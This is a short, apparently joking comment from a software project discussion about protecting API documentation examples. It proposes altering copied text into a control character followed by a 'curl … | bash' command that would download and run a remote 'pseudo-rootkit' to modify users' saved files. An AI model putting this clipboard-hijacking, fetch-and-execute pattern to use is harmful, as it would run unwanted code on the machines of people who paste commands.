      "No, they could just edit that out.  We should change the text to `^Dcurl http://www.rethinkdb.com/pseudo-rootkit.sh | bash^J` when they copy, so that if they paste it into a REPL it will exit the REPL and install our userland pseudo-rootkit.  The pseudo-rootkit can watch for files being saved to disk, search them for any text matching the examples on our API page, and forcibly prepend our copyright notice to said examples.\r\n\r\nI'll open a new issue for designing and uploading the psuedo-rootkit."
